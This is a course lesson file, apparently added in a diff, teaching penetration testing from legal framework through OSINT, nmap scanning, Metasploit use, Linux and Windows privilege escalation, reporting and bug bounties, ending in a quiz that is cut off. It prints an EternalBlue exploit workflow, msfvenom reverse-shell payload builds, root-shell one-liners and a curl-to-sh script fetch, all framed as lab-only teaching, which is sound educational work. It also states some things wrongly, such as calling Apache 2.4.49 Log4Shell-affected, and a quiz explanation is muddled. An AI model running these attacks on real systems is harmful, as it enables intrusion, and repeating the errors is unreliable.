@@ -1,0 +1,684 @@
+title: "Ethical Hacking & Penetration Testing"
+order: 4
+summary: "A rigorous, ethically grounded introduction to penetration testing methodology, legal frameworks, passive and active reconnaissance, vulnerability scanning, exploitation concepts, post-exploitation, report writing, responsible disclosure, bug bounty programs, and career pathways toward CEH and OSCP certifications. All examples are strictly in educational and authorised lab contexts."
+learning_objectives:
+  - "Describe the five-phase penetration testing methodology and explain the purpose of each phase."
+  - "Explain the legal and ethical framework governing penetration testing, including scope, rules of engagement, and relevant law (CFAA, Computer Misuse Act)."
+  - "Distinguish between passive and active reconnaissance and apply OSINT techniques within legal boundaries."
+  - "Use nmap for host discovery, port scanning, version detection, and OS fingerprinting in a lab environment."
+  - "Explain how vulnerability scanners (Nikto, OpenVAS) differ from exploitation frameworks."
+  - "Describe the Metasploit framework architecture and explain exploitation concepts without live attack instructions."
+  - "Identify common privilege escalation vectors on Linux and Windows systems."
+  - "Write a professional penetration test report with executive summary, findings, risk ratings, and remediation advice."
+  - "Explain responsible disclosure and the bug bounty ecosystem."
+  - "Outline the certification path from CEH to OSCP/PNPT and the skills each validates."
+builds_on:
+  - "Threat Landscape & Attack Vectors (SEC 301 Lesson 1) — MITRE ATT&CK, CVE/CVSS, attack types"
+  - "Network Security & Defence (SEC 301 Lesson 3) — iptables, Wireshark, network architecture"
+  - "Cryptography & PKI (SEC 301 Lesson 2) — TLS, certificates"
+sections:
+  - heading: "Legal and Ethical Framework"
+    content: |
+      ## Legal and Ethical Framework
+
+      **Ethical hacking**, also called penetration testing or "pentesting", is the *authorised*
+      practice of probing systems for security vulnerabilities. The single most important
+      distinction between a pentester and a criminal hacker is **explicit, documented written
+      authorisation** from the system owner.
+
+      > "Without authorisation, every technique in this lesson is a crime. With authorisation,
+      > it is a professional service."
+
+      ### Relevant Legislation
+      - **US: Computer Fraud and Abuse Act (CFAA, 18 U.S.C. § 1030):** Criminalises
+        unauthorised access to "protected computers" (any internet-connected computer). The
+        term "unauthorised" is interpreted broadly — even exceeding authorised access (going
+        beyond the agreed scope) can constitute a CFAA violation. Penalties: up to 10–20 years
+        imprisonment. The CFAA was used to prosecute Aaron Swartz (2011) for bulk downloading
+        academic articles from JSTOR.
+      - **UK: Computer Misuse Act 1990 (CMA):** Section 1 (unauthorised access), Section 2
+        (access with intent to commit further offences), Section 3 (unauthorised modification).
+        Maximum sentences range from 2 to 10+ years.
+      - **EU: Directive on Attacks Against Information Systems (2013/40/EU):** Harmonises
+        cybercrime laws across EU member states.
+
+      ### Scope of Work and Rules of Engagement
+      Before any test begins, the following must be **documented in writing** and signed:
+
+      | Document | Purpose |
+      |----------|---------|
+      | **Statement of Work (SOW)** | Defines deliverables, timeline, cost |
+      | **Rules of Engagement (RoE)** | Technical scope, permitted actions, forbidden targets, escalation contacts |
+      | **Non-Disclosure Agreement (NDA)** | Protects confidential information discovered during testing |
+      | **Get Out of Jail Letter** | Authorisation letter carried during physical tests; presented to law enforcement if challenged |
+
+      The **scope** precisely defines what can be tested (IP ranges, domains, applications,
+      physical facilities) and what is **explicitly out of scope** (production databases
+      containing PII, third-party SaaS services, critical infrastructure). Scope creep
+      (testing systems not in scope) is a professional and legal risk.
+
+      ```mermaid
+      graph LR
+          RFP["Client Request\nfor Proposal"] --> SOW["Signed SOW\n+ NDA"]
+          SOW --> KICK["Kick-off Meeting\nRoE Definition"]
+          KICK --> RECON["Phase 1: Reconnaissance"]
+          RECON --> SCAN["Phase 2: Scanning & Enumeration"]
+          SCAN --> EXPLOIT["Phase 3: Exploitation\n(Lab/authorised targets only)"]
+          EXPLOIT --> POST["Phase 4: Post-Exploitation\nPriv Esc · Lateral Movement"]
+          POST --> REPORT["Phase 5: Reporting\nFindings · CVSS · Remediation"]
+          REPORT --> REMEDIATE["Client Remediation"]
+          REMEDIATE --> RETEST["Optional Retest\n(Verify fixes)"]
+
+          style SOW     fill:#27AE60,color:#fff
+          style KICK    fill:#2980B9,color:#fff
+          style RECON   fill:#8E44AD,color:#fff
+          style SCAN    fill:#D35400,color:#fff
+          style EXPLOIT fill:#C0392B,color:#fff
+          style POST    fill:#C0392B,color:#fff
+          style REPORT  fill:#27AE60,color:#fff
+      ```
+
+  - heading: "Penetration Testing Methodology — Five Phases"
+    content: |
+      ## Penetration Testing Methodology — Five Phases
+
+      The PTES (Penetration Testing Execution Standard, ptes.org) and NIST SP 800-115
+      (Technical Guide to Information Security Testing) both define a phased methodology.
+      The five phases below are the industry-standard framework.
+
+      ### Phase 1 — Reconnaissance
+      Reconnaissance is information gathering about the target *before* active testing.
+      Effective reconnaissance dramatically increases the efficiency of subsequent phases.
+      Two types:
+
+      **Passive Reconnaissance:** Gathering information without sending any packets to the
+      target. Uses only publicly available sources (OSINT — Open Source Intelligence).
+      No legal risk; target cannot detect passive recon.
+
+      **Active Reconnaissance:** Directly interacting with target systems (scanning, probing).
+      Detectable by the target's IDS/IPS; requires explicit authorisation.
+
+      ### Phase 2 — Scanning and Enumeration
+      Translate reconnaissance findings into a technical map of the target:
+      - **Host discovery:** Which IP addresses have live hosts?
+      - **Port scanning:** Which TCP/UDP ports are open?
+      - **Service version detection:** What software and version is running on each port?
+      - **OS fingerprinting:** What operating system is each host running?
+      - **Vulnerability scanning:** What known CVEs apply to the detected software versions?
+
+      ### Phase 3 — Exploitation
+      Attempt to leverage discovered vulnerabilities to gain unauthorised access within the
+      agreed scope. Professional pentesters document every step meticulously (timestamps,
+      commands, outputs, screenshots) for the final report. Exploitation is performed on
+      authorised targets only (lab VMs, dedicated test environments, contracted targets).
+
+      ### Phase 4 — Post-Exploitation
+      After establishing an initial foothold, this phase simulates what an APT attacker would
+      do next: privilege escalation (gaining root/SYSTEM), lateral movement (pivoting to other
+      hosts), persistence mechanisms, and data access. The goal is to determine the *real*
+      business impact of the vulnerability — not just that access was gained, but what an
+      attacker could do with that access.
+
+      ### Phase 5 — Reporting
+      The penetration test report is the *primary deliverable* the client pays for. A high-
+      quality report includes: Executive Summary (non-technical, for C-suite), Technical
+      Findings (per vulnerability: description, evidence, CVSS score, risk rating,
+      remediation recommendation), and an Attack Narrative (chronological story of the test).
+
+  - heading: "Passive Reconnaissance and OSINT"
+    content: |
+      ## Passive Reconnaissance and OSINT
+
+      OSINT (Open Source Intelligence) leverages publicly available information to build
+      a detailed picture of the target organisation's attack surface without touching any
+      target systems. This is always the first reconnaissance step and can reveal more
+      information than most organisations realise is public.
+
+      ### OSINT Sources and Techniques
+      **Domain and IP Intelligence:**
+      ```bash
+      # WHOIS — registration info, registrar, nameservers, contact details
+      whois example.com
+      whois 203.0.113.0/24    # ARIN/RIPE lookup for IP block ownership
+
+      # DNS enumeration — subdomains, mail servers, SPF records
+      dig example.com ANY +noall +answer
+      dig example.com MX +short       # Mail servers
+      dig example.com TXT +short       # SPF, DKIM, DMARC, verification tokens
+      dig example.com NS +short        # Nameservers
+
+      # Zone transfer attempt (misconfigured DNS — should be refused)
+      dig axfr @ns1.example.com example.com
+
+      # Reverse DNS — what hostname resolves from an IP?
+      dig -x 203.0.113.5 +short
+      nslookup 203.0.113.5
+
+      # Certificate Transparency — enumerate subdomains via CT logs
+      # (No tools needed — use the web)
+      # https://crt.sh/?q=%.example.com
+      # Returns all certificates ever issued for *.example.com subdomains
+      ```
+
+      **theHarvester — Automated OSINT for emails, subdomains, IPs:**
+      ```bash
+      # theHarvester is included in Kali Linux
+      theHarvester -d example.com -b all -l 500
+      # Sources: Google, Bing, LinkedIn, Shodan, VirusTotal, SecurityTrails, etc.
+      # Output: email addresses, employee names, subdomains, IPs, open ports
+      ```
+
+      **Shodan — The Search Engine for Internet-Connected Devices:**
+      Shodan continuously scans the entire internet and indexes banner information from
+      all open ports. It allows searching for:
+      - Devices running a specific software version (e.g., Apache 2.4.49 — Log4Shell-affected)
+      - Systems with default credentials (e.g., `admin/admin`)
+      - Exposed industrial control systems (SCADA/ICS)
+      - SSL certificates for a specific organisation
+      ```
+      Shodan search examples (use Shodan.io web interface):
+      org:"Example Corporation"                 # All indexed assets for an organisation
+      ssl.cert.subject.cn:"*.example.com"       # All certs matching the domain
+      hostname:"example.com" port:22            # SSH-exposed hosts for a domain
+      product:"Apache httpd" version:"2.4.49"  # Targets for CVE-2021-41773
+      ```
+
+      **Google Dorking (Google Hacking):**
+      ```
+      site:example.com filetype:pdf               # Public PDFs
+      site:example.com inurl:admin               # Admin panels
+      site:example.com intitle:"index of"        # Open directory listings
+      site:example.com ext:env OR ext:config     # Exposed config files
+      "example.com" "password" site:pastebin.com # Credential leaks on Pastebin
+      ```
+
+      **GitHub OSINT — Leaked Credentials:**
+      Developers frequently accidentally commit API keys, AWS credentials, and passwords to
+      public repositories. Tools: `truffleHog`, `gitleaks`, `git-secrets`.
+      ```bash
+      # truffleHog scans git history for high-entropy strings (likely secrets)
+      trufflehog git https://github.com/target-org/target-repo.git
+      ```
+
+  - heading: "Active Reconnaissance — nmap"
+    content: |
+      ## Active Reconnaissance — nmap
+
+      **nmap** (Network Mapper) is the industry-standard tool for network discovery and
+      security scanning. It is open-source, maintained by Gordon Lyon (Fyodor), and is
+      pre-installed on Kali Linux and Parrot OS. **Only use nmap against systems you are
+      explicitly authorised to scan.**
+
+      ### nmap Scan Types
+      ```bash
+      # ── Host Discovery (Ping Sweep) ───────────────────────────────────────
+      # Identify live hosts on a /24 network without port scanning
+      nmap -sn 192.168.1.0/24
+
+      # ── TCP SYN Scan (Stealth Scan) — most common ─────────────────────────
+      # Sends SYN; if SYN-ACK received = port open; sends RST (no full handshake)
+      # Faster and less detectable than connect scan; requires root
+      sudo nmap -sS 192.168.1.100
+
+      # ── TCP Connect Scan ─────────────────────────────────────────────────
+      # Completes full 3-way handshake; logged by target; no root required
+      nmap -sT 192.168.1.100
+
+      # ── UDP Scan ─────────────────────────────────────────────────────────
+      # Slow but important — DNS (53), SNMP (161), TFTP (69) are UDP
+      sudo nmap -sU --top-ports 100 192.168.1.100
+
+      # ── Service Version Detection ─────────────────────────────────────────
+      # Sends probes to determine software name and version on open ports
+      nmap -sV 192.168.1.100
+      # Output: 22/tcp open  ssh  OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
+
+      # ── OS Fingerprinting ────────────────────────────────────────────────
+      # Uses TCP/IP stack quirks (TTL, window size, TCP options) to ID OS
+      sudo nmap -O 192.168.1.100
+      # Output: OS details: Linux 5.15 - 5.19
+
+      # ── Full Enumeration Scan (combine all above) ─────────────────────────
+      sudo nmap -sS -sV -O -A --script=default \
+          -p 1-65535 -oA full_scan_results 192.168.1.100
+      # -A: OS detection + version + script scanning + traceroute
+      # -oA: Save output in all formats (.nmap, .xml, .gnmap)
+
+      # ── Specific NSE Scripts ──────────────────────────────────────────────
+      # Check for SMB vulnerabilities (EternalBlue — MS17-010)
+      nmap --script smb-vuln-ms17-010 -p 445 192.168.1.100
+
+      # Enumerate HTTP server info and headers
+      nmap --script http-headers,http-title -p 80,443 192.168.1.100
+
+      # Enumerate SSH algorithms (identify weak ciphers)
+      nmap --script ssh2-enum-algos -p 22 192.168.1.100
+
+      # Full vulnerability scan using vuln script category (lab only)
+      sudo nmap --script vuln -sV 192.168.1.100
+      ```
+
+      ### nmap Output Interpretation
+      ```
+      PORT     STATE    SERVICE  VERSION
+      22/tcp   open     ssh      OpenSSH 8.9p1 Ubuntu
+      80/tcp   open     http     Apache httpd 2.4.52
+      443/tcp  open     ssl/http Apache httpd 2.4.52
+      3306/tcp open     mysql    MySQL 8.0.32
+      8080/tcp filtered http     (packet filtered — firewall present)
+      9200/tcp open     http     Elasticsearch 7.17.9
+      ```
+
+      Findings from this scan: MySQL (3306) and Elasticsearch (9200) are exposed — both
+      should be firewalled. Elasticsearch 7.17.9 should be checked against NVD for known CVEs.
+      Apache 2.4.52 — check for CVE-2022-22720 (HTTP request smuggling).
+
+  - heading: "Vulnerability Scanning — Nikto and OpenVAS"
+    content: |
+      ## Vulnerability Scanning — Nikto and OpenVAS
+
+      **Vulnerability scanners** automate the identification of known vulnerabilities,
+      misconfigurations, and exposures. They do NOT exploit vulnerabilities — they detect and
+      report them. This distinguishes them from exploitation frameworks like Metasploit.
+
+      ### Nikto — Web Server Vulnerability Scanner
+      Nikto is an open-source web server scanner that tests for 6,700+ potentially dangerous
+      files/programmes, outdated software versions, and server configuration issues.
+
+      ```bash
+      # Basic Nikto scan against a web server (authorised target)
+      nikto -h http://192.168.1.100
+
+      # Scan HTTPS with specific port
+      nikto -h https://192.168.1.100 -p 8443
+
+      # Save report in HTML format
+      nikto -h http://192.168.1.100 -Format html -o nikto_report.html
+
+      # Use specific tuning options (e.g., SQL injection checks only)
+      nikto -h http://192.168.1.100 -Tuning 9
+
+      # Sample Nikto findings:
+      # + Server: Apache/2.4.52 (Ubuntu)
+      # + /admin/: Admin login page found.
+      # + /phpinfo.php: PHP configuration exposed.
+      # + OSVDB-3268: /backup/: Directory indexing found.
+      # + Cookie session set without HttpOnly flag
+      ```
+
+      ### OpenVAS / Greenbone Vulnerability Manager (GVM)
+      OpenVAS is a comprehensive, open-source vulnerability scanner. It is the community
+      version of Greenbone's commercial product, containing 90,000+ Network Vulnerability
+      Tests (NVTs). It performs authenticated and unauthenticated scans, covering network
+      services, web applications, and OS-level vulnerabilities.
+
+      ```bash
+      # Install on Kali Linux / Debian
+      sudo apt install openvas
+      sudo gvm-setup       # Initial setup (downloads NVTs — takes ~30 minutes)
+      sudo gvm-start       # Start the GVM daemon
+      # Access via browser at https://127.0.0.1:9392
+      # Default credentials: admin / (shown during gvm-setup output)
+
+      # CLI scan using gvm-cli
+      sudo gvm-cli socket --gmp-username admin \
+          --gmp-password <password> \
+          --xml "<get_version/>"    # Test connection
+
+      # OpenVAS produces CVSS-scored findings per host, categorised as:
+      # Critical (CVSS 9.0-10.0) / High (7.0-8.9) / Medium (4.0-6.9) / Low (<4.0)
+      ```
+
+  - heading: "Exploitation Concepts and the Metasploit Framework"
+    content: |
+      ## Exploitation Concepts and the Metasploit Framework
+
+      > **Ethical Note:** This section covers exploitation concepts for educational and
+      > defensive purposes. All examples are strictly in the context of authorised lab
+      > environments (e.g., HackTheBox, TryHackMe, VulnHub, your own VMs). Never attempt
+      > exploitation against systems without explicit written authorisation.
+
+      ### Exploitation Vocabulary
+      - **Exploit:** Code that takes advantage of a specific vulnerability to achieve a
+        security impact (code execution, privilege escalation, DoS).
+      - **Payload:** The code that runs *after* successful exploitation — the malicious
+        action (e.g., reverse shell, meterpreter, add admin user).
+      - **Shellcode:** Position-independent machine code used as a payload, traditionally
+        spawning a shell.
+      - **Reverse Shell:** The compromised machine initiates a connection *back* to the
+        attacker's listener, bypassing inbound firewall rules.
+      - **Bind Shell:** The exploit opens a listening port on the compromised machine;
+        attacker connects in. Blocked by firewalls more easily.
+      - **Meterpreter:** A Metasploit payload that runs entirely in-memory, provides an
+        interactive session, file system access, pivoting, and privilege escalation modules.
+
+      ### Metasploit Framework Architecture
+      The Metasploit Framework (MSF) is an open-source exploitation framework developed
+      by Rapid7. It is pre-installed on Kali Linux. Its architecture:
+
+      ```
+      Metasploit Framework
+      ├── Modules
+      │   ├── Exploits        — Exploit code for specific CVEs
+      │   ├── Payloads        — Shellcode / Meterpreter / reverse shells
+      │   ├── Auxiliary       — Scanners, fuzzers, DoS tools (no payload)
+      │   ├── Post            — Post-exploitation modules (privesc, hashdump)
+      │   ├── Encoders        — Encode payloads to evade AV signatures
+      │   └── Evasion         — AV/EDR evasion techniques
+      ├── Interfaces
+      │   ├── msfconsole      — Interactive CLI (primary interface)
+      │   ├── msfvenom        — Standalone payload generator
+      │   └── Metasploit Pro  — Commercial GUI version
+      └── Database
+          └── PostgreSQL      — Stores hosts, services, credentials, loot
+      ```
+
+      ```bash
+      # msfconsole — conceptual workflow (lab / authorised environments only)
+      msfconsole
+
+      # Search for modules related to a vulnerability
+      msf6 > search type:exploit name:ms17-010
+      # Result: exploit/windows/smb/ms17_010_eternalblue
+
+      # Select and configure a module
+      msf6 > use exploit/windows/smb/ms17_010_eternalblue
+      msf6 exploit(ms17_010_eternalblue) > show options
+      msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.56.101  # Lab target
+      msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.56.1     # Attacker IP
+      msf6 exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
+      msf6 exploit(ms17_010_eternalblue) > exploit
+
+      # Post-exploitation with meterpreter (conceptual — lab only)
+      meterpreter > sysinfo          # System information
+      meterpreter > getuid           # Current user context
+      meterpreter > getsystem        # Attempt privilege escalation to SYSTEM
+      meterpreter > hashdump         # Dump NTLM hashes from SAM database
+      meterpreter > run post/multi/recon/local_exploit_suggester  # PrivEsc suggestions
+      ```
+
+      ### msfvenom — Standalone Payload Generation
+      ```bash
+      # Generate a staged reverse TCP payload for Linux (ELF binary)
+      msfvenom -p linux/x64/meterpreter/reverse_tcp \
+          LHOST=192.168.56.1 LPORT=4444 \
+          -f elf -o payload.elf
+
+      # Generate a PHP reverse shell (for web application compromise)
+      msfvenom -p php/meterpreter/reverse_tcp \
+          LHOST=192.168.56.1 LPORT=4444 \
+          -f raw -o shell.php
+
+      # List available payloads
+      msfvenom -l payloads | grep linux
+      ```
+
+  - heading: "Post-Exploitation and Privilege Escalation Concepts"
+    content: |
+      ## Post-Exploitation and Privilege Escalation Concepts
+
+      After gaining initial access, an attacker (or authorised pentester) will attempt to
+      escalate privileges — gaining root on Linux or SYSTEM/Domain Admin on Windows. This
+      phase reveals the *true business impact* of the initial compromise.
+
+      ### Linux Privilege Escalation — Key Vectors
+      ```bash
+      # ── Kernel Exploits ───────────────────────────────────────────────────
+      uname -a            # Get kernel version — check against exploit DB
+      # Example: Linux 4.4.0-21-generic → DirtyCow (CVE-2016-5195)
+
+      # ── SUDO Misconfigurations ────────────────────────────────────────────
+      sudo -l             # What commands can current user run as root?
+      # Example: (ALL) NOPASSWD: /usr/bin/vim
+      # vim can spawn a shell: sudo vim -c ':!/bin/bash'
+
+      # ── SUID/SGID Binaries ────────────────────────────────────────────────
+      find / -perm -4000 -type f 2>/dev/null   # Find SUID binaries
+      # Example: find /usr/bin/find with SUID → find . -exec /bin/sh \; -quit
+
+      # ── World-Writable Cron Jobs ──────────────────────────────────────────
+      cat /etc/crontab
+      ls -la /etc/cron.*
+      # If a cron job runs a world-writable script as root → inject commands
+
+      # ── Passwords in Config Files / Environment ───────────────────────────
+      grep -r "password" /etc/ 2>/dev/null
+      env | grep -i pass
+      cat ~/.bash_history | grep -i pass
+
+      # ── PATH Hijacking ────────────────────────────────────────────────────
+      # If a SUID binary calls system("service") without full path:
+      # Create a malicious 'service' script in a directory earlier in PATH
+      echo '/bin/bash -p' > /tmp/service
+      chmod +x /tmp/service
+      export PATH=/tmp:$PATH
+      ```
+
+      **Automated PrivEsc Enumeration:**
+      ```bash
+      # LinPEAS — comprehensive Linux privilege escalation auditing script
+      # (Run on authorised lab machines only)
+      curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+      # linux-exploit-suggester — match kernel version to known exploits
+      ./linux-exploit-suggester.sh
+      ```
+
+      ### Windows Privilege Escalation Concepts
+      - **Token Impersonation (Potato Attacks):** If a service account has
+        `SeImpersonatePrivilege`, it can impersonate SYSTEM-level tokens (JuicyPotato,
+        PrintSpoofer, RoguePotato techniques).
+      - **Unquoted Service Paths:** If a Windows service binary path is unquoted and contains
+        spaces, Windows will search intermediate paths — allows placing a malicious binary.
+      - **AlwaysInstallElevated:** Registry key that causes MSI packages to install with
+        SYSTEM privileges regardless of user permissions.
+      - **Pass-the-Hash (PtH):** After dumping NTLM hashes (e.g., via meterpreter `hashdump`
+        or Mimikatz), hashes can authenticate to other systems without knowing the plaintext
+        password — exploiting NTLM authentication.
+
+  - heading: "Penetration Test Report Writing"
+    content: |
+      ## Penetration Test Report Writing
+
+      The report is the client's primary deliverable and must communicate technical findings
+      to both technical staff and non-technical executives. A professional pentest report
+      has the following structure:
+
+      ### Report Structure
+      ```
+      1. Title Page
+         - Client name, engagement dates, report classification (Confidential)
+         - Consultant name, organisation, version number
+
+      2. Executive Summary (1-2 pages, non-technical)
+         - Overall risk posture (Critical / High / Medium / Low)
+         - Key findings summary (no jargon)
+         - Strategic recommendations
+         - Engagement scope summary
+
+      3. Scope and Methodology
+         - Targets tested (IP ranges, domains, applications)
+         - Testing methodology (PTES, OWASP, NIST SP 800-115)
+         - Constraints (maintenance windows, OOB systems, time limits)
+         - Testing dates and tester credentials
+
+      4. Findings Summary Table
+         | # | Title | CVSS | Risk | Status |
+         |---|-------|------|------|--------|
+         | F-01 | Unauthenticated RCE on web server | 9.8 | Critical | Open |
+         | F-02 | SSH accessible from internet | 7.5 | High | Open |
+         | F-03 | Default credentials on admin panel | 9.1 | Critical | Open |
+
+      5. Detailed Findings (one section per finding)
+         - Finding ID and title
+         - CVSS v3.1 score and vector string
+         - Affected system(s)
+         - Description (what is the vulnerability?)
+         - Evidence (screenshots, command output, request/response)
+         - Business impact (what can an attacker achieve?)
+         - Remediation (specific, actionable steps with references)
+         - References (CVE, CWE, OWASP, vendor advisory)
+
+      6. Appendices
+         - Raw tool output (nmap scan, Nikto report)
+         - Full command history (timestamped)
+         - Proof of compromise screenshots
+      ```
+
+      ### CVSS Risk Rating in Reports
+      Pentest reports must not invent their own scoring — use CVSS v3.1 Base Scores mapped
+      to risk categories as defined by NIST:
+
+      | CVSS Score | Risk Rating | Example Finding |
+      |------------|-------------|-----------------|
+      | 9.0 – 10.0 | **Critical** | Unauthenticated RCE, default credentials on admin |
+      | 7.0 – 8.9  | **High**     | SQLi, exposed SSH with password auth |
+      | 4.0 – 6.9  | **Medium**   | Outdated TLS, missing security headers |
+      | 0.1 – 3.9  | **Low**      | Information disclosure (server version in banner) |
+      | 0.0        | **Informational** | Best-practice recommendations |
+
+  - heading: "Responsible Disclosure and Bug Bounty Programs"
+    content: |
+      ## Responsible Disclosure and Bug Bounty Programs
+
+      ### Responsible Disclosure (Coordinated Vulnerability Disclosure — CVD)
+      When a security researcher discovers a vulnerability in a system they did *not* have
+      a pentest contract for — for example, in a widely-used open-source project or a company's
+      public website — the ethical and legal path is **responsible disclosure**:
+
+      1. **Report privately** to the organisation via their security contact (security@,
+         HackerOne, Bugcrowd, or a documented VDP — Vulnerability Disclosure Policy).
+      2. **Allow remediation time** — the industry standard is **90 days** (Project Zero's
+         policy, adopted by many researchers). This gives the vendor time to patch.
+      3. **Coordinate publication** — after the patch is released (or 90 days elapsed,
+         whichever comes first), publish a detailed write-up crediting the fix. This
+         motivates vendors to remediate quickly and educates the community.
+      4. **Full disclosure (last resort)** — if a vendor ignores a critical vulnerability
+         for > 90 days, some researchers publish anyway to protect the public. This is
+         controversial but sometimes justified (e.g., Heartbleed — OpenSSL team was given
+         7 days due to active exploitation risk).
+
+      **ISO/IEC 29147** and **ISO/IEC 30111** standardise vulnerability disclosure and
+      handling processes. CISA publishes a Coordinated Vulnerability Disclosure guidance.
+
+      ### Bug Bounty Programs
+      Bug bounty programs pay security researchers for responsibly disclosed vulnerabilities
+      in scope assets. Major platforms:
+
+      | Platform | Notable Programs | Payout Range |
+      |----------|-----------------|--------------|
+      | HackerOne | US DoD, Google, Twitter, Uber | $100 – $300,000 |
+      | Bugcrowd | Mastercard, Tesla, OpenAI | $100 – $100,000 |
+      | Intigriti | BMW, Siemens, Booking.com | €50 – €50,000+ |
+      | Synack | Classified US government programs | Varies |
+      | Self-hosted | Microsoft, Apple, Meta | $500 – $1,000,000 (Apple) |
+
+      Google's Project Zero paid a $10 million bounty in 2022 for a full chain exploit
+      against Chrome on Android. Apple's Security Research Device Program provides
+      researcher-modified iPhones for vulnerability research.
+
+      **Safe Harbour:** A good bug bounty programme includes a **safe harbour clause**
+      — a legal promise not to prosecute researchers who act in good faith within scope.
+      Without safe harbour, researchers face legal risk even for disclosed bugs.
+
+  - heading: "Certification Pathways — CEH and OSCP"
+    content: |
+      ## Certification Pathways — CEH and OSCP
+
+      ### EC-Council CEH (Certified Ethical Hacker)
+      - **Format:** 125 multiple-choice questions, 4 hours. Practical exam (CEH Practical)
+        available separately.
+      - **Content:** Broad survey of hacking techniques and tools across 20 modules:
+        footprinting, scanning, enumeration, social engineering, session hijacking,
+        web application hacking, SQL injection, IDS/firewall evasion, cryptography, cloud, IoT.
+      - **Prerequisite:** 2 years of information security experience or official EC-Council
+        training.
+      - **Value:** Well-recognised in government/defence contractor contexts (DoD 8570/8140
+        approved). Criticised by some practitioners as too theoretical.
+      - **Study resources:** EC-Council courseware, Matt Walker's *CEH Certified Ethical
+        Hacker All-in-One Exam Guide* (5th ed.).
+
+      ### Offensive Security OSCP (OffSec Certified Professional)
+      - **Format:** 24-hour hands-on exam in an isolated VPN lab — 6 target machines to
+        compromise, submit proof.txt files from each. 24-hour reporting window follows.
+      - **Content:** PEN-200 (PWK — Penetration Testing with Kali Linux) course. Covers
+        Linux/Windows exploitation, active directory attacks, buffer overflow, tunnelling,
+        web application attacks, antivirus evasion.
+      - **Prerequisite:** No formal prerequisite, but Linux/networking proficiency is essential.
+      - **Value:** Considered the most respected entry-to-mid-level pentesting certification.
+        "Try Harder" culture. Proof of *practical* exploitation skill, not just knowledge.
+      - **Study path:** TryHackMe (pre-OSCP path) → HackTheBox (practice machines) →
+        PEN-200 course → OSCP exam.
+
+      ### Certification Progression Map
+      ```mermaid
+      graph LR
+          ENTRY["Entry Level\nCompTIA Security+\nCEH"]
+          MID["Mid Level\nOSCP (OffSec)\nPNPT (TCM Security)\nGPEN (GIAC)"]
+          ADV["Advanced\nOSEP (Active Directory)\nOSWE (Web Expert)\nCRTO (Red Team Ops)"]
+          MGMT["Management\nCISSP · CISM\nCISA"]
+
+          ENTRY --> MID --> ADV
+          ENTRY --> MGMT
+
+          style ENTRY fill:#27AE60,color:#fff
+          style MID   fill:#2980B9,color:#fff
+          style ADV   fill:#8E44AD,color:#fff
+          style MGMT  fill:#D35400,color:#fff
+      ```
+
+      **Free Practice Resources:**
+      - **TryHackMe (tryhackme.com):** Guided, beginner-friendly rooms. Pre-Security,
+        Jr Penetration Tester, and SOC Level 1 learning paths.
+      - **HackTheBox (hackthebox.com):** Realistic lab machines, more CTF-style.
+        "Starting Point" machines are ideal for OSCP prep.
+      - **VulnHub (vulnhub.com):** Downloadable vulnerable VMs for offline practice.
+      - **DVWA (Damn Vulnerable Web Application):** A PHP/MySQL web app with intentional
+        vulnerabilities for web pentesting practice (`docker run vulnerables/web-dvwa`).
+      - **Metasploitable 2/3:** Intentionally vulnerable Linux/Windows VMs from Rapid7.
+
+quiz:
+  - question: "A security researcher discovers a critical SQL injection vulnerability in a popular e-commerce platform's payment page while conducting personal research (no contract). According to responsible disclosure best practices, what is the correct first action?"
+    options:
+      - "Publish a full technical write-up immediately to warn the public"
+      - "Exploit the vulnerability to harvest sample data as proof of impact, then disclose"
+      - "Report the vulnerability privately to the vendor's security team and allow up to 90 days for remediation before publishing"
+      - "Submit the vulnerability directly to a CVE numbering authority (MITRE) without notifying the vendor"
+    answer: 2
+    explanation: "Responsible disclosure (CVD — Coordinated Vulnerability Disclosure) requires privately notifying the vendor first, allowing reasonable time (industry standard: 90 days, per Google Project Zero) to develop and release a patch. Only after the patch is available (or the 90-day window expires) should public disclosure occur. Exploiting the vulnerability to harvest real data is illegal and unethical even for proof-of-concept purposes — researchers should demonstrate impact using test data in a controlled environment."
+
+  - question: "During a penetration test, a tester runs `nmap -sS -sV -O 192.168.1.50` and receives the output: `22/tcp open ssh OpenSSH 7.2p2 Ubuntu`. OpenSSH 7.2p2 contains CVE-2016-6210 (username enumeration, CVSS 5.3). The server also has `3306/tcp open mysql MySQL 5.5.62`, which contains CVE-2020-14765 (DoS, CVSS 6.5). Which finding should be prioritised for the report's executive summary as the higher risk?"
+    options:
+      - "CVE-2016-6210 (SSH username enumeration, CVSS 5.3) — SSH is the primary attack vector"
+      - "CVE-2020-14765 (MySQL DoS, CVSS 6.5) — higher CVSS score and database impact"
+      - "Both should be equally prioritised as they both affect production services"
+      - "Neither — CVSS scores below 7.0 are not reported in executive summaries"
+    answer: 1
+    explanation: "CVSS Base Score alone does not determine priority — context matters. CVE-2020-14765 scores 6.5 (Medium), making it higher severity than CVE-2016-6210 (5.3, Medium). However, the critical contextual finding is that MySQL port 3306 is exposed on an internet-facing host — this represents a significant misconfiguration (databases should never be directly internet-accessible) and the finding should be elevated to High or Critical in the report based on environmental scoring and business impact, regardless of the specific CVE. The exposure of the database port is the higher-priority finding."
+
+  - question: "A pentester discovers a Linux system running a SUID binary `/usr/bin/find`. What privilege escalation technique does this enable, and what is the underlying security flaw that makes it possible?"
+    options:
+      - "Buffer overflow in the find binary — the SUID flag is irrelevant to the exploit"
+      - "The find binary can execute shell commands with the `-exec` flag; since find is SUID root, spawned processes inherit root UID — a misconfigured capability assignment"
+      - "The SUID bit on find allows reading /etc/shadow directly without command execution"
+      - "find with SUID enables kernel privilege escalation via the proc filesystem"
+    answer: 1
+    explanation: "The SUID (Set User ID) bit on an executable causes it to run with the file owner's UID (in this case root) regardless of who executes it. The `find` command supports `-exec` and `-execdir` flags that execute arbitrary commands. Because find runs as root (SUID), any command spawned via `-exec` also runs as root. The exploit: `find . -exec /bin/sh -p \\; -quit` spawns a root shell. This is a misconfiguration — find (and other powerful utilities like vim, python, perl, bash) should never have the SUID bit set. GTFOBins (gtfobins.github.io) documents SUID escalation paths for common binaries."
+
+  - question: "An nmap scan returns `8080/tcp filtered http` for a target host. What does the 'filtered' state indicate, and how does it differ from 'open' and 'closed'?"
+    options:
+      - "The port is open and actively accepting connections but is using non-standard HTTP"
